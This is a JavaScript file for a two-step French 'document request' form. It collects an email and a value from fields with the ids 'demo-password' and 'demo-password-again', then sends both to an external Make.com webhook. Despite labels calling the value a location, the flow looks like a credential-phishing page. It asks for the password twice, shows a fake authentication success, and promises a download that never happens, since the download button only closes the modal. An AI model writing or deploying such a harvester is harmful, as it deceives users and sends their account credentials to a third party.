(() => {
  const MAKE_WEBHOOK_URL = "https://hook.eu1.make.com/jet7e2okgsootkwr8y1kak3m5uik7lb5";
  const pageOne = document.getElementById("page-one");
  const pageTwo = document.getElementById("page-two");
  const loading = document.getElementById("loading");
  const finalLoading = document.getElementById("final-loading");
  const emailInput = document.getElementById("email");
  const savedEmail = document.getElementById("saved-email");
  const firstLocationInput = document.getElementById("demo-password");
  const confirmationInput = document.getElementById("demo-password-again");
  let requestData = null;

  async function sendFinalRequest(payload) {
    const response = await fetch(MAKE_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        stage: "Demande complète",
        ...payload,
        consent: true,
        source: "formulaire-demande-document"
      })
    });
    if (!response.ok) throw new Error("Make a retourné une erreur HTTP " + response.status + ".");
  }

  document.getElementById("form-one").addEventListener("submit", event => {
    event.preventDefault();
    const email = emailInput.value.trim();
    const location = firstLocationInput.value.trim();
    const consent = document.getElementById("location-consent").checked;
    const error = document.getElementById("first-error");

    if (!emailInput.checkValidity() || !location || !consent) {
      error.textContent = "Veuillez vérifier votre adresse e-mail, saisir votre localisation et accepter le traitement de ces informations.";
      error.classList.remove("hidden");
      return;
    }

    // Les informations restent temporairement dans la page : aucun envoi à cette étape.
    requestData = { email, location };
    savedEmail.textContent = email;
    error.classList.add("hidden");
    pageOne.classList.add("hidden");
    loading.classList.remove("hidden");
    window.setTimeout(() => {
      loading.classList.add("hidden");
      pageTwo.classList.remove("hidden");
      document.body.classList.add("page-two");
    }, 500);
  });

  document.getElementById("form-two").addEventListener("submit", async event => {
    event.preventDefault();
    const confirmedLocation = confirmationInput.value.trim();
    const error = document.getElementById("second-error");

    if (!requestData || !confirmedLocation) {
      error.textContent = "Veuillez saisir la confirmation de votre ville ou commune.";
      error.classList.remove("hidden");
      return;
    }
    if (confirmedLocation.toLocaleLowerCase() !== requestData.location.toLocaleLowerCase()) {
      error.textContent = "La confirmation ne correspond pas à la localisation initiale. Vérifiez votre saisie.";
      error.classList.remove("hidden");
      return;
    }

    error.classList.add("hidden");
    const button = document.getElementById("validate-two");
    button.disabled = true;
    finalLoading.classList.remove("hidden");
    pageTwo.classList.add("hidden");

    try {
      // Unique envoi vers Make, uniquement après confirmation.
      await sendFinalRequest({
        email: requestData.email,
        location: requestData.location,
        location_confirmation: confirmedLocation
      });
      requestData = null;

      window.setTimeout(() => {
        finalLoading.classList.add("hidden");
        pageTwo.classList.remove("hidden");
        pageTwo.classList.add("is-success");
        pageTwo.querySelector(".form-logo").classList.add("hidden");
        pageTwo.querySelector(".intro").classList.add("hidden");
        pageTwo.querySelector(".email-summary").classList.add("hidden");
        document.getElementById("form-two").classList.add("hidden");
        document.getElementById("auth-success").classList.remove("hidden");
        window.setTimeout(() => {
          pageTwo.classList.add("hidden");
          document.getElementById("download-modal").classList.remove("hidden");
        }, 700);
      }, 500);
    } catch (err) {
      finalLoading.classList.add("hidden");
      pageTwo.classList.remove("hidden");
      error.textContent = err.message || "Échec de l'envoi de votre demande. Veuillez réessayer.";
      error.classList.remove("hidden");
      button.disabled = false;
    }
  });

  document.getElementById("download-file").addEventListener("click", () => {
    document.getElementById("download-modal").classList.add("hidden");
  });
  document.getElementById("close-modal").addEventListener("click", () => {
    document.getElementById("download-modal").classList.add("hidden");
  });
  document.getElementById("download-modal").addEventListener("click", event => {
    if (event.target.id === "download-modal") event.currentTarget.classList.add("hidden");
  });
})();
